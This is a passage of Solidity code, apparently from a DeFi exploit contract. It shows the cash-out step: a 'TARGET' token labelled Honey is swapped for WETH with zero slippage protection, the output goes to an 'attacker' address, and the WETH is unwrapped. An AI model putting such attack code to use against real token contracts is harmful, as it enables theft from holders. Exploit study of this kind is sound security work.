        // Create sell path: Honey -> WETH
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = weth;

        // Swap tokens for WETH
        IRouter(routerAddress).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            sellPath,
            attacker,
            block.timestamp
        );

        // Convert WETH to BNB
        uint256 wethBalance = IWETH(weth).balanceOf(attacker);
        IWETH(weth).withdraw(wethBalance);

        return wethBalance;
    }

